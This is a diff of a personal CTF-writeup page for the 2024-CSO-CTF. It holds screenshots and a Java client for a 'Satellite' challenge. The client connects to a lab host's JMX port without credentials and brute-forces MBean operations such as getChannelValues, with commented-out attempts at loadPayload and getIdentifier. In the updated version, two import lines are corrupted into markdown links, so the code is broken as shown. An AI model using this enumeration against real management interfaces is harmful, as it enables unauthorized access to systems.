@@ -3,45 +3,49 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>2024-CSO-CTF · Will Seligman</title>
-<link rel="stylesheet" href="/assets/style.css">
+<meta name="color-scheme" content="dark">
+<title>2024-CSO-CTF · the-grizzly-bear</title>
+<meta name="description" content="2024-CSO-CTF — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
 <div class="layout">
 <aside class="sidebar" id="sidebar">
-  <a class="brand" href="/index.html">
+  <a class="brand" href="../index.html">
     <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
   </a>
-  <nav class="nav" id="nav-root" data-current="other/2024-cso-ctf.html"></nav>
+  <nav class="nav" id="nav-root" data-current="other/2024-cso-ctf.html" data-root=".."></nav>
 </aside>
 <main class="content">
   <article class="doc">
-  <div class="breadcrumb"><a href="/other/index.html">Other</a></div>
-  <h1 id="2024-cso-ctf">2024-CSO-CTF</h1>
-<p><span class="img-missing">image unavailable</span></p>
-<p><span class="img-missing">image unavailable</span></p>
+  <div class="breadcrumb"><a href="../index.html">the-grizzly-bear</a> &rsaquo; <a href="index.html">Other</a></div>
+<h1 id="title">2024-CSO-CTF</h1>
+
+<p class="figure"><a class="img-link" href="2024-cso-ctf/image.png"><img src="2024-cso-ctf/image.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-cso-ctf/image-1.png"><img src="2024-cso-ctf/image-1.png" alt="image.png" loading="lazy"></a></p>
 <p>Personal</p>
-<p><span class="img-missing">image unavailable</span></p>
+<p class="figure"><a class="img-link" href="2024-cso-ctf/image-2.png"><img src="2024-cso-ctf/image-2.png" alt="image.png" loading="lazy"></a></p>
 <p>Successfully got flag from Reverse challenge</p>
-<p><span class="img-missing">image unavailable</span></p>
-<p><span class="img-missing">image unavailable</span></p>
-<p><span class="img-missing">image unavailable</span></p>
+<p class="figure"><a class="img-link" href="2024-cso-ctf/image-3.png"><img src="2024-cso-ctf/image-3.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-cso-ctf/image-4.png"><img src="2024-cso-ctf/image-4.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-cso-ctf/image-5.png"><img src="2024-cso-ctf/image-5.png" alt="image.png" loading="lazy"></a></p>
 <p>The Satellite challenge</p>
-<p><span class="img-missing">image unavailable</span></p>
+<p class="figure"><a class="img-link" href="2024-cso-ctf/image-6.png"><img src="2024-cso-ctf/image-6.png" alt="image.png" loading="lazy"></a></p>
 <pre><code class="language-java">import javax.management.*;
 import javax.management.remote.*;
 import java.util.*;
-import java.io.*;
-import java.net.*;
+import [java.io](http://java.io/).*;
+import [java.net](http://java.net/).*;
 
 public class JMXConnect {
 public static void main(String[] args) throws Exception {
-String mbean = &quot;gov.sfb.schriever:type=Galileo&quot;;
-String hostname = &quot;10.0.2.135&quot;;
+String mbean = "gov.sfb.schriever:type=Galileo";
+String hostname = "10.0.2.135";
 int port = 1958;
-    JMXServiceURL jmxUrl = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://&quot; + hostname + &quot;:&quot; + port + &quot;/jmxrmi&quot;);
+    JMXServiceURL jmxUrl = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + hostname + ":" + port + "/jmxrmi");
     JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxUrl, null);
 
     try {
@@ -50,64 +54,104 @@ int port = 1958;
         MBeanInfo mbeanInfo = mbs.getMBeanInfo(mbeanName);
 
         // Print attributes
-        System.out.println(&quot;Attributes:&quot;);
+        System.out.println("Attributes:");
         for (MBeanAttributeInfo attr : mbeanInfo.getAttributes()) {
             String attrName = attr.getName();
-            if (attrName.startsWith(&quot;channels&quot;)) {
+            if (attrName.startsWith("channels")) {
                 Object attrValue = mbs.getAttribute(mbeanName, attrName);
-                System.out.println(&quot;\\tName: &quot; + attrName + &quot;, Value: &quot; + attrValue);
+                System.out.println("\\tName: " + attrName + ", Value: " + attrValue);
             }
         }
 
     // Print the available operations
-    System.out.println(&quot;Available Operations:&quot;);
+    System.out.println("Available Operations:");
     for (MBeanOperationInfo op : mbeanInfo.getOperations()) {
-        System.out.println(&quot;\\tOperation Name: &quot; + op.getName());
+        System.out.println("\\tOperation Name: " + op.getName());
      }
 
     // Invoke the loadPayload operation
-        //System.out.println(&quot;Loading payload...&quot;);
+        //System.out.println("Loading payload...");
         //Object[] loadPayloadParams = {0}; // Assuming payload ID is 0
-        //String[] loadPayloadSignature = {&quot;int&quot;};
-        //mbs.invoke(mbeanName, &quot;loadPayload&quot;, loadPayloadParams, loadPayloadSignature);
-        //System.out.println(&quot;Payload loaded successfully.&quot;);
+        //String[] loadPayloadSignature = {"int"};
+        //mbs.invoke(mbeanName, "loadPayload", loadPayloadParams, loadPayloadSignature);
+        //System.out.println("Payload loaded successfully.");
 
         // Invoke the getChannelValues operation
-        //System.out.println(&quot;Getting channel values...&quot;);
-        //Object result = mbs.invoke(mbeanName, &quot;getChannelValues&quot;, null, null);
-        //System.out.println(&quot;Channel values: &quot; + result);
+        //System.out.println("Getting channel values...");
+        //Object result = mbs.invoke(mbeanName, "getChannelValues", null, null);
+        //System.out.println("Channel values: " + result);
 
         // Declare totalChannels and totalSubchannels variables
         int totalChannels = 350;
         int totalSubchannels = 260;
 
         //Iterate over channels and subchannels
-        System.out.println(&quot;Channel Values:&quot;);
+        System.out.println("Channel Values:");
         for (int channel = 1; channel &lt;= totalChannels; channel++) {
             for (int subchannel = 1; subchannel &lt;= totalSubchannels; subchannel++) {
                 try {
                     Object[] params = {channel, subchannel};
-                    String[] signature = {&quot;int&quot;, &quot;int&quot;};
-                    Object result = mbs.invoke(mbeanName, &quot;getChannelValues&quot;, params, signature);
-                    System.out.println(&quot;Channel &quot; + channel + &quot;, Subchannel &quot; + subchannel + &quot;: &quot; + result);
+                    String[] signature = {"int", "int"};
+                    Object result = mbs.invoke(mbeanName, "getChannelValues", params, signature);
+                    System.out.println("Channel " + channel + ", Subchannel " + subchannel + ": " + result);
                 } catch (Exception e) {
-                    System.err.println(&quot;Error invoking getChannelValues for Channel &quot; + channel + &quot;, Subchannel &quot; + subchannel + &quot;: &quot; + e.getMessage());
+                    System.err.println("Error invoking getChannelValues for Channel " + channel + ", Subchannel " + subchannel + ": " + e.getMessage());
                     e.printStackTrace();
                 }
             }
         }
 
+        //System.out.println("Getting identifiers...");
+        //Object result = mbs.invoke(mbeanName, "getIdentifier", new Object[1], new String[string]);
+    //System.out.println("Identifies: " + result);
+
+    // Find and print parameters of "getIdentifier" operation
+            //System.out.println("Parameters of getIdentifier operation:");
+            //for (MBeanOperationInfo operation : mbeanInfo.getOperations()) {
+                //if (operation.getName().equals("getIdentifier")) {
+                    //MBeanParameterInfo[] signature = operation.getSignature();
+                    //for (MBeanParameterInfo param : signature) {
+                        //System.out.println("\\tParameter: " + param.getName() + ", Type: " + param.getType());
+                    //}
+                    //break;
+                //}
+            //}
+
+        // Enumerate and print identifier channels
+        //System.out.println("Identifier Channels:");
+        //int totalChannels = 350;
+        //for (int i = 1; i &lt;= totalChannels; i++) {
+            //try {
+                //Object[] params = {i};
+                //String[] signature = {"int"};
+                //Object result = mbs.invoke(mbeanName, "getIdentifier", params, signature);
+                //System.out.println("\\tChannel " + i + ": " + result);
+            //} catch (Exception e) {
+                //System.err.println("Error invoking getIdentifier for Channel " + i + ": " + e.getMessage());
+            //}
+        //}
+
+    // Invoke the getIdentifier operation
+    //System.out.println("Identifier Channels:");
+    //Object result = mbs.invoke(mbeanName, "getChannelValues", null, null);
+    //System.out.println(result);
+
+    // Invoke the getIdentifier operation
+    //System.out.println("Identifier Channels:");
+    //Object[] params = new Object[0];
+    //String[] signature = new String[0];
+    //Object result = mbs.invoke(mbeanName, "getIdentifier", params, signature);
+    //System.out.println(result);
     } finally {
         jmxConnector.close();
     }
 }
-}
-</code></pre>
+}</code></pre>
   </article>
-  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
 </div>
-<script src="/assets/nav.js" defer></script>
+<script src="../assets/nav.js" defer></script>
 <script>
 document.getElementById('menu-toggle').addEventListener('click',function(){
   document.getElementById('sidebar').classList.toggle('open');
